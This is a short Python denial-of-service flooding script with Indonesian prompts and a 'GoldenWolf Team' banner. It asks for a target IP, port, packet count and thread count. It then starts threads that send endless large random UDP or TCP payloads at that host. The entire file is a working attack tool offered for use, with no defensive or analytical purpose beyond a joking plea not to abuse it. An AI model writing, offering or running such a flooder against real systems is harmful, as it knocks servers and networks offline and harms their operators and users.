#Autor By Cyber
#Reedit By FoxDev
import random
import socket
import threading
import os

os.system("clear")
print("\033[32m")
print("#-- DOOS BY --#")
print("╔═════════════════════════╗")
print("""
╭━━━╮╱╱╭╮╱╱╭╮╱╱╱╱╱╭╮╭╮╭╮╱╱╭╮╭━╮
┃╭━╮┃╱╱┃┃╱╱┃┃╱╱╱╱╱┃┃┃┃┃┃╱╱┃┃┃╭╯
┃┃╱╰╋━━┫┃╭━╯┣━━┳━╮┃┃┃┃┃┣━━┫┣╯╰╮
┃┃╭━┫╭╮┃┃┃╭╮┃┃━┫╭╮┫╰╯╰╯┃╭╮┃┣╮╭╯
┃╰┻━┃╰╯┃╰┫╰╯┃┃━┫┃┃┣╮╭╮╭┫╰╯┃╰┫┃
╰━━━┻━━┻━┻━━┻━━┻╯╰╯╰╯╰╯╰━━┻━┻╯
""")
print("╚═════════════════════════╝")
print("--> KALAU MAU PAKEK JANGAN ABUSE JIER <--")
print("#-- TOOLS BY FoxDev --#")
ip = str(input(" Masukan IP:"))
port = int(input(" Port:"))
choice = str(input(" Langsung Tancep Gak?(y/n):"))
times = int(input(" Mau Berapa Packets?:"))
threads = int(input(" Isi Packets Threads?:"))
def run():
	data = random._urandom(20000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" GoldenWolf Team Attack!!!")
		except:
			print("[!] KokTuru!!!")

def run2():
	data = random._urandom(696969)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" GoldenWolf Team Attack!!!")
		except:
			s.close()
			print("[*] Kokturu")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
